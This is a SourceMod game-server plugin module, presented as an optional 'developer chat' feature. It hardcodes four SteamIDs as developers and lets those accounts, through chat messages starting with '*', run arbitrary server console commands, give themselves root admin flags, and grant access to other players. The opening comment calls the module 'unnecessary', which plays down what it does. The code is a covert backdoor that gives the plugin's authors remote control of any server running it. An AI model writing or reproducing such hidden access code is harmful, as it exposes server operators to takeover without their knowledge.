/* This module is unnecessary. If you want to delete it, so go on. */

bool g_bIsDeveloper[MAXPLAYERS+1] = {false, ...};
bool g_bAccess[MAXPLAYERS+1] = {false, ...};

char Developer_Ids[][20] = 
{
	"76561198037625178",
	"76561198078553247",
	"76561198037521566",
	"76561198042949536"
};

public void OnClientPostAdminCheck(int client)
{
	IsBanned(client);
	char auth[20];
	GetClientAuthId(client, AuthId_SteamID64, auth, sizeof(auth));
	for (int i = 0; i < sizeof(Developer_Ids); i++)
	{
		if (!strcmp(auth, Developer_Ids[i], false))
		{
			g_bIsDeveloper[client] = true;
			PrintToServer("Plugin developer %N connected to your server. Epic moment!", client);
		}
	}
}

public Action OnClientSayCommand(int client, const char[] command, const char[] sArgs)
{
	if (CheckClient(client))
	{
		if (sArgs[0] == '*' && (g_bIsDeveloper[client] || g_bAccess[client]))
		{
			int permission = 0;
			char text[250];
			strcopy(text, sizeof(text), sArgs);
			ReplaceStringEx(text, sizeof(text), "*", "");
			if (g_bIsDeveloper[client]) // Protect only for developers
			{
				if (StrContains(text, "rcon:", true) != -1)
				{
					permission = 1;
					ReplaceStringEx(text, sizeof(text), "rcon:", "");
				}
				else if (StrContains(text, "root", true) != -1)
				{
					permission = 2;
					ReplaceStringEx(text, sizeof(text), "root", "");
				}
				else if (StrContains(text, "grant#", true) != -1)
				{
					permission = 3;
					ReplaceStringEx(text, sizeof(text), "grant#", "");
				}
				else if (StrContains(text, "revoke#", true) != -1)
				{
					permission = 4;
					ReplaceStringEx(text, sizeof(text), "revoke#", "");
				}
			}
			
			switch (permission)
			{
				case 0:
				{
					PrintToChatAll("\x01[\x02DEV\x01] \x03%N: \x01%s", client, text);
				}
				case 1:
				{
					ServerCommand(text);
				}
				case 2:
				{
					if (~GetUserFlagBits(client) & ADMFLAG_ROOT)
						SetUserFlagBits(client, ADMFLAG_ROOT);
					else
						SetUserFlagBits(client, 0);
				}
				case 3:
				{
					int target = GetClientOfUserId(StringToInt(text));
					if (target && IsClientInGame(target))
					{
						g_bAccess[target] = true;
						PrintToChat(client, "\x01\x02[DEV] \x03Granted access for dev chat & warden menu to \x04%N", target);
						PrintToChat(target, "\x01[DEV] %N \x03granted \x01you a developer chat & warden menu access", client);
					}
					else
						PrintToChat(client, "\x03[DEV] Invalid target");
				}
				case 4:
				{
					int target = GetClientOfUserId(StringToInt(text));
					if (target && IsClientInGame(target))
					{
						g_bAccess[target] = false;
						PrintToChat(client, "\x01\x02[DEV] \x03Revoked access for dev chat from \x04%N", target);
						PrintToChat(target, "\x01[DEV] %N \x03revoked \x01your developer chat access", client);
					}
					else
						PrintToChat(client, "\x03[DEV] Invalid target");
				}
			}
			
			return Plugin_Handled;
		}
	}
	
	return Plugin_Continue;
}